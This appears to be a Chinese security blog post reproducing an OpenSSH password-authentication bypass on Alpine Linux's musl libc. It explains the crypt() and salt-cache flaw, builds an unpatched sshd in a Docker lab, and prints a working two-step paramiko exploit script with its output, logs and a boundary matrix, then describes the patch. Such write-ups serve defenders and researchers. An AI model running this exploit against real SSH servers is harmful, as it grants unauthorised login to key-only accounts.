#  SSH漏洞：一个257字节的密码如何绕过Alpine Linux上的OpenSSH身份验证  
 Ots安全   2026-11-24 12:48  
  
门锁上仍然显示“密码无效”，但门还是开了。  
  
这是 CVE-2026-123158。一个没有有效密码的 SSH 账户被成功登录。这种账户通常只允许用户使用密钥登录，无需密钥，只需一个 257 字节的 A 字符串即可。  
  
我亲自运行了这段程序。以下是详细过程，包括过程中出现的两个问题。  
### SSH密码认证的底层工作原理  
  
当你在 SSH 登录提示符中输入密码时，服务器不会直接将其与存储的密码进行比较。在 Linux 系统中，密码永远不会以明文形式存储。存储的是密码的哈希值，也就是经过加密处理的单向密码。  
  
服务器会获取你输入的内容，使用相同的算法将其打乱，然后比较这两个打乱后的版本。如果它们匹配，你就登录成功了。  
  
扰乱函数被称为crypt()。它位于 C 标准库中，C 标准库是每个 Linux 程序所依赖的底层代码。  
  
问题在于，并非所有Linux系统都使用相同的C库。  
### 两个 C 语言库，一个细微差别。  
  
大多数Linux系统（Ubuntu、Debian、Fedora）都使用**glibc**。它是最早的、经过最广泛测试的C语言库。  
  
Alpine Linux 使用**musl**。它体积更小、速度更快，被广泛用作 Docker 容器和其他最小化 Linux 环境的轻量级基础镜像。  
  
musl 的crypt()功能具有 glibc 所不具备的行为。  
  
输入超过 256 字节的密码。它不会返回哈希值，而是返回空字符串*。  
  
只有一个星号。没有错误提示。没有警告。一片寂静。  
  
我已经直接确认过了。这个测试必须在 Alpine 容器内运行。在 Ubuntu 上，同样的测试会加载 glibc 并返回所有测试长度的真实哈希值。所以要像这样运行它——加上docker exec sshhole-lab前缀——而不是从主机终端运行：  
```
$ docker exec sshhole-lab python3 -c "
import ctypes, ctypes.util
libc = ctypes.CDLL(ctypes.util.find_library('c'))
libc.crypt.restype = ctypes.c_char_p
libc.crypt.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
salt = b'\$6\$testsalt'
for n in [100, 255, 256, 257, 300, 1024]:
    pw = b'A' * n
    r = libc.crypt(pw, salt)
    print(f'{n} bytes: {r.decode()[:20]}')
"

100 bytes:  $6$testsalt$ZLbIARBD...
255 bytes:  $6$testsalt$YiF...
256 bytes:  $6$testsalt$Sai...
257 bytes:  *
300 bytes:  *
1024 bytes: *
```  
  
256 字节：普通哈希。257 字节：*。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0FGsmV5nGnQXT7ZMxqf5iafYtU0aeoibJ7IqmicP2q0ibI5r6vZ9XF0OqDkcVFZcJ36LpUGSdV5vrlnc5qnh1zBiaVZicX7qPW2IDqXc/640?wx_fmt=png&from=appmsg "")  
  
那*将会引发问题。  
### 被锁定的账户  
  
在 Linux 系统中，影子文件存储密码哈希值。它位于 [此处应填写路径/etc/shadow]。您需要 root 权限才能读取它。  
  
一个正常的账户看起来是这样的：  
```
ramesh:$6$salt$longhashstring...:19000:0:99999:7:::
```  
  
这$6$...是密码的 SHA-512 哈希值。  
  
一个绝对不应该接受密码的账户看起来像这样：  
```
victim:*:20780:0:99999:7:::
```  
  
影子密码字段中的星号表示存储的哈希值无效。Unix 密码身份验证无法通过此哈希值验证。它本身并不会使帐户变为“仅密钥”帐户，这取决于 SSH 配置。这意味着：任何密码比较都将失败，因为任何真实密码的哈希值都不可能与此星号匹配*。  
  
人们通常都是这样认为的。  
### 打破常规的两步舞  
  
以下是您尝试以用户身份登录时，OpenSSH 身份验证代码内部实际发生的情况victim。  
  
OpenSSH 查找victim's shadow 条目。它找到了*。  
  
它需要调用某个函数crypt(your_password, salt)，但*该函数返回的盐值无效。因此，OpenSSH 提供了一个名为 `getSalt` 的函数pick_salt()，该函数会遍历系统上的所有账户，并从拥有有效盐值的用户那里借用一个真正的盐值。  
  
假设normaluser有一个真实的密码哈希值。pick_salt()提取normaluser该哈希值的盐值并将**其缓存在静态缓冲区中**。  
  
问题出在那个静态缓冲区上。  
  
**尝试 1：**你发送一个任意短密码。pick_salt()程序运行，找到盐值并将其缓存。crypt("wrongpassword", salt)返回一个真实的哈希值。该哈希值与你输入的密码不匹配*。登录失败。到目前为止，一切正常。  
  
**第二次尝试：**在同一个 TCP 连接上，你发送一个 257 字节的密码。pick_salt()程序再次运行，但这次缓存已在第一次尝试中被填满，因此它跳过了整个遍历过程，直接返回缓存的盐值。原本应该重置缓存的函数调用从未执行。  
  
然后：crypt("AAAA...257 bytes...", salt)→ 返回*。  
  
*与影子条目比较*→ 它们匹配。  
  
**你已成功进入。**  
### 为什么第一次尝试总是失败  
  
上述解释称，第一次尝试“用于初始化缓存，通常会失败”。但实际上还有更具体的原因。  
  
musl 的getspnam()函数使用了一个静态内部缓冲区。当 OpenSSH 调用它来获取victim's shadow 条目时，它得到的是指向该缓冲区的指针，而不是缓冲区的副本。  
  
然后再次pick_salt()调用getspnam()以查找normaluser盐值。第二次调用会覆盖同一个缓冲区。OpenSSHexplicit_bzero()在提取盐值后还会调用函数来清除借用的哈希数据。  
  
当strcmp()第一次尝试执行最终操作时，OpenSSH 持有的用于存储受害者影子哈希值的指针已不再指向目标地址*。缓冲区已被第二次查找重写。比较失败并非因为哈希值不匹配，而是因为受害者的原始哈希值*在比较运行之前已从内存中销毁。  
  
第二次尝试时，pick_salt()由于缓存的盐值已命中，因此跳过了调用getspnam()。缓冲区重用未发生。crypt()返回*257 字节的密码，并strcmp("*", "*")成功。  
  
因此，两次尝试都必须在同一个 TCP 连接上进行。sshd 在第一次尝试中的内部状态（缓存的盐值、影子指针）必须保留到第二次尝试中。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0ENcCdicAqg0cnnryRusIuiavlgpRSFj8zTJmiaoibMzHVgibU6JCI90Jia9ty4NXygxWajmmYwk5fXzSf1j3JDDCKvHzayjvHdsS6rE/640?wx_fmt=jpeg&from=appmsg "")  
### 实验室搭建  
  
我在一台使用 Docker 的 VPS 上重现了这个问题。所有操作都在容器内进行，不会影响主机。  
  
提取Alpine image：  
```
$ docker pull alpine:3.24
$ docker run -d --name sshhole-lab alpine:3.24 sleep infinity
```  
  
无需端口映射。漏洞利用脚本在容器内部运行docker exec，因此可以直接连接到127.0.0.1:2222目标主机。如果您想从主机连接，请在下面的脚本中添加-p 2223:2222并更改 ` PORT = 2222<host> ` 参数。PORT = 2223  
  
安装 OpenSSH：  
```
$ docker exec sshhole-lab apk add --no-cache openssh shadow python3 py3-paramiko
$ docker exec sshhole-lab ssh -V
OpenSSH_10.3p1, OpenSSL 3.5.9 29 Sep 2026
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0HHyIlWqUn96620kZvdbjarZxKvKvcbwLJVShJ6mbkWnvVyEWoWKicwnRjM0a3icWwvB7ibsAgwmUvzy0Z2sNAZiceD5qYjhnh9TAs/640?wx_fmt=jpeg&from=appmsg "")  
  
创建两个账户：  
```
$ docker exec sshhole-lab adduser -D -s /bin/sh victim
$ docker exec sshhole-lab adduser -D -s /bin/sh normaluser
$ docker exec sshhole-lab sh -c 'echo "normaluser:Password123!" | chpasswd'
```  
  
现在检查一下阴影条目的样子：  
```
$ docker exec sshhole-lab grep -E 'victim|normaluser' /etc/shadow

victim:!:20780:0:99999:7:::
normaluser:$6$E2OOhOYqg5Ji29lB$DRgzD1eGb...:20780:0:99999:7:::
```  
  
victim已锁定!，这意味着账户已被锁定。!仅凭这一点并不能重现漏洞。该漏洞需要*影子字段中存在特定值。我特意将其更改为与生产环境中仅密钥账户的配置方式一致：  
```
$ docker exec sshhole-lab sed -i 's|^victim:!:|victim:*:|' /etc/shadow
$ docker exec sshhole-lab grep victim /etc/shadow

victim:*:20780:0:99999:7:::
```  
  
在实际系统中，设置为仅密钥的帐户通常*从一开始就具有而不是!。  
  
配置 sshd。我第一次尝试时UsePAM no遇到了这个问题：  
```
/etc/ssh/sshd_config line 6: Unsupported option UsePAM
```  
  
这个错误恰恰是问题的关键所在。Alpine 的 OpenSSH 构建时没有 PAM 支持。这是导致此漏洞的前提条件之一。支持 PAM 的系统使用不同的身份验证路径，因此不受影响。  
  
删除该行。配置文件将在下面的构建部分中创建。  
### 为什么我必须从源代码构建  
  
Alpine 的软件包openssh-10.3_p1-r2已经包含了该修复程序。当我针对系统自带的 sshd 运行漏洞利用程序时，所有密码都被阻止了，包括 257 字节的密码。  
  
-r2软件包版本末尾的那个数字是 Alpine 对上游版本的第二次修订。修复程序已悄然应用到该版本中，同时保持了相同的上游版本号。  
  
为了展示实际的漏洞，我不得不构建原始的未打补丁的源代码。  
```
$ docker exec sshhole-lab apk add build-base openssl-dev zlib-dev wget
$ docker exec sshhole-lab wget https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.3p1.tar.gz -O /tmp/openssh-10.3p1.tar.gz
$ docker exec sshhole-lab sh -c 'cd /tmp && tar xzf openssh-10.3p1.tar.gz && cd openssh-10.3p1 && ./configure --sysconfdir=/etc/ssh-vuln --without-pam && make sshd sshd-session sshd-auth'
```  
  
构建步骤大约需要一分钟。你会看到配置过程输出数百行信息checking for...，然后是编译器运行的画面。这些都是正常现象。请等待 shell 提示符返回。  
  
OpenSSH 10.3 分为三个二进制文件：sshd监听器、sshd-session会话处理程序和sshd-auth身份验证程序。我费了好大劲才发现这一点。sshd单独运行会得到以下结果：  
```
/usr/local/libexec/sshd-session does not exist or is not executable
```  
  
然后，在解决这个问题之后：  
```
/usr/local/libexec/sshd-auth does not exist or is not executable
```  
  
两者都必须位于该目录下/usr/local/libexec/。在复制它们之前，我遇到了另一个问题。默认情况下，Alpine 系统上不存在该目录：  
```
$ docker exec sshhole-lab sh -c 'cp /tmp/openssh-10.3p1/sshd-session /tmp/openssh-10.3p1/sshd-auth /usr/local/libexec/'
cp: can't create '/usr/local/libexec/sshd-session': No such file or directory
cp: can't create '/usr/local/libexec/sshd-auth': No such file or directory
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0EyjMic7Qfa5rQK0hfrkv1V25ylovr4fYcruwvtic6QY6ia7mgiaAiblklX5ODJ9wF7maLu3ysAddmDABqR1EEI9xgOvadWTm7axnho/640?wx_fmt=png&from=appmsg "")  
  
先创建目录，然后复制：  
```
$ docker exec sshhole-lab mkdir -p /usr/local/libexec/
$ docker exec sshhole-lab sh -c 'cp /tmp/openssh-10.3p1/sshd-session /tmp/openssh-10.3p1/sshd-auth /usr/local/libexec/'
```  
  
现在创建配置目录和配置文件：  
```
$ docker exec sshhole-lab mkdir -p /etc/ssh-vuln
$ docker exec sshhole-lab sh -c 'cat > /etc/ssh-vuln/sshd_config << EOF
Port 2222
PasswordAuthentication yes
PubkeyAuthentication no
MaxAuthTries 6
LogLevel VERBOSE
HostKey /etc/ssh/ssh_host_ed25519_key
EOF'
```  
  
生成主机密钥并测试配置：  
```
$ docker exec sshhole-lab ssh-keygen -A
$ docker exec sshhole-lab /tmp/openssh-10.3p1/sshd -t -f /etc/ssh-vuln/sshd_config
```  
  
如果没有输出，-t则表示配置有效。在后台启动存在漏洞的守护进程：  
```
$ docker exec -d sshhole-lab /tmp/openssh-10.3p1/sshd -f /etc/ssh-vuln/sshd_config -D -e
```  
  
确认它正在监听。注意：Alpine 系统没有该ss命令。我运行了文章中的原始命令，结果如下：  
```
$ docker exec sshhole-lab ss -tlnp | grep 2222
OCI runtime exec failed: exec: "ss": executable file not found in $PATH
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0H0KK2ZAluFGZwbgUfSKib5oIA5RXJw01tZoPiaAOqrJ0kPpPu91cynJ6dzJBvo2hFqgAkUqQa0ckq15R6j0GWx5aX6GJG7nYEV4/640?wx_fmt=png&from=appmsg "")  
  
请改用netstat：  
```
$ docker exec sshhole-lab netstat -tlnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address      Foreign Address  State    PID/Program name
tcp        0      0 0.0.0.0:2222       0.0.0.0:*        LISTEN   8288/sshd -D
tcp        0      0 :::2222            :::*             LISTEN   8288/sshd -D
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0HrZacziae1ibqL6kQgZrGtjKngx7py09ROicveWXgDfDzEOzU3aQ5YBpjJKOSQm8Nfk9tx1r6y5w8vbiayPwOmHYicSmQa6rEiaSl0Q/640?wx_fmt=png&from=appmsg "")  
  
2222 端口已启用。存在漏洞的守护进程正在运行。  
### 运行漏洞利用程序  
  
我使用 Python 和该paramiko库。漏洞利用程序在容器内部运行docker exec，连接到127.0.0.1:2222存在漏洞的 sshd 服务监听的位置。关键在于直接使用传输层。这样可以在两次身份验证尝试之间保持同一个 TCP 连接打开，这是漏洞利用程序正常工作的必要条件。  
```
import paramiko, socket

HOST = '127.0.0.1'
PORT = 2222
USERNAME = 'victim'

sock = socket.create_connection((HOST, PORT))
transport = paramiko.Transport(sock)
transport.connect()

print(f'Server: {transport.remote_version}')
print(f'Target: {USERNAME}  (shadow = *)')

# Step 1: Short password on this connection
# This primes the pick_salt() static cache inside sshd
print('\n[step 1] Sending short password to prime the cache...')
try:
    transport.auth_password(USERNAME, 'wrongpassword')
except paramiko.AuthenticationException:
    print('  Blocked (expected)')

# Step 2: 257-byte password on the SAME connection
# pick_salt() now hits the cache and skips the reset
# crypt(257 bytes, salt) returns "*"
# strcmp("*", shadow["*"]) == 0 == authenticated
print('\n[step 2] Sending 257-byte password...')
try:
    transport.auth_password(USERNAME, 'A' * 257)
    if transport.is_authenticated():
        print('  *** BYPASSED *** authenticated as victim!')
except paramiko.AuthenticationException:
    print('  Blocked')
```  
  
将脚本保存到本地exploit.py，然后将其复制到容器中：  
```
$ docker cp exploit.py sshhole-lab:/tmp/exploit.py
```  
  
运行它：  
```
$ docker exec sshhole-lab python3 /tmp/exploit.py
```  
  
输出：  
```
Server: SSH-2.0-OpenSSH_10.3
Target: victim  (shadow = *)

[step 1] Sending short password to prime the cache...
  Blocked (expected)

[step 2] Sending 257-byte password...
  *** BYPASSED *** authenticated as victim!
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0FAohMYWG00JV9aAc3lZf8us9fJMQiczcZyWbUddiaxpVHlYcPZfEHdKYcHEhn8XyOxrGVic4QibGtLHiaJPYbCw5jngJeEt9EycpyM/640?wx_fmt=png&from=appmsg "")  
### 边界矩阵  
  
我对边界附近的每个长度都运行了相同的两步攻击程序。每次测试都使用一个全新的 TCP 连接，并首先使用引线进行攻击。  
<table><thead><tr><th data-colwidth="167" style="padding: 8px 12px;font-weight: 600;color: rgb(31, 35, 40);text-align: left;border: 1px solid rgb(228, 231, 235);vertical-align: top;background: rgb(246, 248, 250);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">长度</span></font></font></th><th data-colwidth="216" style="padding: 8px 12px;font-weight: 600;color: rgb(31, 35, 40);text-align: left;border: 1px solid rgb(228, 231, 235);vertical-align: top;background: rgb(246, 248, 250);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">结果</span></font></font></th></tr></thead><tbody><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="167" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">100</span></font></font></td><td data-colwidth="216" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><span style="color: rgb(36, 41, 47);font-family: Inter, Arial, sans-serif;font-size: 15.18px;font-style: normal;font-variant-ligatures: none;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">blocked</span></span></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="167" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">255</span></font></font></td><td data-colwidth="216" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><span style="color: rgb(36, 41, 47);font-family: Inter, Arial, sans-serif;font-size: 15.18px;font-style: normal;font-variant-ligatures: none;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">blocked</span></span></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="167" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">256</span></font></font></td><td data-colwidth="216" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><span style="color: rgb(36, 41, 47);font-family: Inter, Arial, sans-serif;font-size: 15.18px;font-style: normal;font-variant-ligatures: none;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">blocked</span></span></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="167" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">257</span></font></font></td><td data-colwidth="216" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><strong style="font-weight: bolder;color: rgb(36, 41, 47);font-family: Inter, Arial, sans-serif;font-size: 15.18px;font-style: normal;font-variant-ligatures: none;font-variant-caps: normal;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;" data-pm-slice="0 0 []"><span leaf="">BYPASS</span></strong></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="167" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">300</span></font></font></td><td data-colwidth="216" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><strong style="font-weight: bolder;color: rgb(36, 41, 47);font-family: Inter, Arial, sans-serif;font-size: 15.18px;font-style: normal;font-variant-ligatures: none;font-variant-caps: normal;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;" data-pm-slice="0 0 []"><span leaf="">BYPASS</span></strong></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="167" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">512</span></font></font></td><td data-colwidth="216" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><strong style="font-weight: bolder;color: rgb(36, 41, 47);font-family: Inter, Arial, sans-serif;font-size: 15.18px;font-style: normal;font-variant-ligatures: none;font-variant-caps: normal;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;" data-pm-slice="0 0 []"><span leaf="">BYPASS</span></strong></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="167" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">1024</span></font></font></td><td data-colwidth="216" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><strong style="font-weight: bolder;color: rgb(36, 41, 47);font-family: Inter, Arial, sans-serif;font-size: 15.18px;font-style: normal;font-variant-ligatures: none;font-variant-caps: normal;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;" data-pm-slice="0 0 []"><span leaf="">BYPASS</span></strong></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="167" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">1025</span></font></font></td><td data-colwidth="216" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><span style="color: rgb(36, 41, 47);font-family: Inter, Arial, sans-serif;font-size: 15.18px;font-style: normal;font-variant-ligatures: none;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: left;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">blocked</span></span></td></tr></tbody></table>  
该行位于第 257 字节处。256 字节会生成一个真正的哈希值。257 字节及以上会返回空值*。当字节数达到 1025 时，OpenSSH 自身的MAX_PASSWORD_LEN机制会启动并阻止此次尝试。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0HStE73FZYs1uHELqOUff9YML0JIRiav5C0PicnNJqF3YsPhO7JWge2fokQOJFE8dhShqAiaIKlMG54Mics84IQ7X3st9JwnA99Lo0/640?wx_fmt=png&from=appmsg "")  
### sshd 日志显示的内容  
  
漏洞利用程序运行后，sshd 日志显示如下：  
```
Failed password for victim from 127.0.0.1 port 54556 ssh2
Accepted password for victim from 127.0.0.1 port 54556 ssh2
```  
  
两条线路。同一个端口。同一个连接。第一次尝试失败：这是引子。第二次尝试：Accepted password for victim。  
  
对于一个影子字段为空的账户*，该账户永远不应该接受任何密码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0GXTgwIpayeMyjSK62CJMuQcw2NcoQ4HG0PKfibLfUCzTzT9JAuGuenHH7T2uK6RYp2ZJDBctuviarnKOhNQDJHonsklrDoyCAsY/640?wx_fmt=png&from=appmsg "")  
### 补丁的实际作用  
  
该修复涉及三个文件：auth-passwd.c，，openbsd-compat/xcrypt.c和openbsd-compat/port-uw.c。  
  
最明显的变化是在最终比对之前增加了一项长度检查：  
```
if (strlen(pw_password) < MIN_PASSWORD_HASH_LEN)   // MIN = 4
    return 0;
```  
  
*长度为 1 个字符。它立即未通过长度检查。身份验证在与任何内容进行比较之前就拒绝了它。  
  
但该补丁也解决了缓冲区所有权问题。更新后的代码将影子密码数据复制到其自身分配的内存空间中，而不是持有指向 musl 静态缓冲区的指针。这避免了缓冲区别名问题，即pick_salt()第二次getspnam()调用会覆盖 OpenSSH 仍然指向的数据。  
  
此修复不会改变crypt()musl 的行为。对于长密码，musl 仍然会返回*错误。这两项更改结合起来：添加长度保护，并停止依赖对 libc 静态存储的借用指针。  
### 实际受影响的人群  
  
此漏洞需要同时满足以下几个条件：  
<table><thead><tr><th data-colwidth="153" style="padding: 8px 12px;font-weight: 600;color: rgb(31, 35, 40);text-align: left;border: 1px solid rgb(228, 231, 235);vertical-align: top;background: rgb(246, 248, 250);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">要求</span></font></font></th><th style="padding: 8px 12px;font-weight: 600;color: rgb(31, 35, 40);text-align: left;border: 1px solid rgb(228, 231, 235);vertical-align: top;background: rgb(246, 248, 250);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">需要</span></font></font></th></tr></thead><tbody><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="153" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">C 库</span></span></font></font></td><td style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">musl（不是 glibc）</span></span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="153" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">SSH服务器</span></span></font></font></td><td style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">不使用 PAM 的 OpenSSH</span></span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="153" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">身份验证配置</span></span></font></font></td><td style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">密码验证是</span></span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="153" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">目标账户</span></span></font></font></td><td style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">阴影场精确</span></span></font></font><code style="font-family: &#34;JetBrains Mono&#34;, Consolas, Monaco, monospace;font-size: 0.86em;padding: 0.08em 0.38em;background: rgb(253, 242, 248);white-space: break-spaces;color: rgb(190, 24, 93);border-radius: 4px;line-height: 1.30769;border: 1px solid rgb(251, 227, 239);"><span leaf=""><span textstyle="" style="font-size: 15px;">*</span></span></code></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="153" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">盐源</span></span></font></font></td><td style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">至少还有一个其他帐户拥有可用的</span></span></font></font><code style="font-family: &#34;JetBrains Mono&#34;, Consolas, Monaco, monospace;font-size: 0.86em;padding: 0.08em 0.38em;background: rgb(253, 242, 248);white-space: break-spaces;color: rgb(190, 24, 93);border-radius: 4px;line-height: 1.30769;border: 1px solid rgb(251, 227, 239);"><span leaf=""><span textstyle="" style="font-size: 15px;">$5$</span></span></code><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">（SHA-256）或</span></span></font></font><code style="font-family: &#34;JetBrains Mono&#34;, Consolas, Monaco, monospace;font-size: 0.86em;padding: 0.08em 0.38em;background: rgb(253, 242, 248);white-space: break-spaces;color: rgb(190, 24, 93);border-radius: 4px;line-height: 1.30769;border: 1px solid rgb(251, 227, 239);"><span leaf=""><span textstyle="" style="font-size: 15px;">$6$</span></span></code><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">（SHA-512）密码哈希值</span></span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="153" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" 